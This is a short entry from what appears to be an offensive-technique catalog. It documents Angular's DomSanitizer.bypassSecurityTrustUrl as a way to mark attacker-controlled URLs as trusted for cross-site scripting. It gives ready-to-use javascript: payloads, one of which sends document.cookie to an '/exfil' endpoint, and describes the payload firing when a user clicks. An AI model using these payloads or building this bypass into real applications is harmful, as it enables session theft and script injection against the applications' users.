---
id: 53470ff8-d21c-4f38-a431-bcb7a333e911
name: angular-bypass-security-trust-url
type: command
executor: typescript
data: this.sanitizer.bypassSecurityTrustUrl(this.dangerousUrl)
output: null
created_at: '2023-04-06T03:56:43.795667+00:00'
updated_at: '2023-04-10T20:24:52.282255+00:00'
platforms:
  - Web
tags:
  - xss
  - angular
verified: true
validated: true
---

# angular-bypass-security-trust-url

## Command

```typescript
this.sanitizer.bypassSecurityTrustUrl(this.dangerousUrl);
```

## Description

This TypeScript method call in an Angular component bypasses the DomSanitizer's security checks, marking a potentially dangerous URL as trusted for binding to HTML attributes like [href] or [src]. In an attack context, it allows injection of javascript: payloads for XSS execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| this.sanitizer | Injected DomSanitizer service instance | Yes |
| this.dangerousUrl | User-controlled string, e.g., 'javascript:alert(document.cookie)' | Yes |

## Examples

### Basic Usage

```typescript
this.trustedUrl = this.sanitizer.bypassSecurityTrustUrl('javascript:alert("XSS")');
```

### Advanced Usage

```typescript
this.trustedUrl = this.sanitizer.bypassSecurityTrustUrl('javascript:fetch("/exfil?data=" + document.cookie)');
```

## Expected Output

Returns a SafeUrl object that Angular treats as trusted, allowing the URL to be bound without sanitization. No console errors for the bound attribute; payload executes on interaction (e.g., click).

## Related

- [[procedures/Bypass-Angular-DomSanitizer-for-XSS-Injection]]
- [[codes/Angular-DomSanitizer-Bypass-Example]]
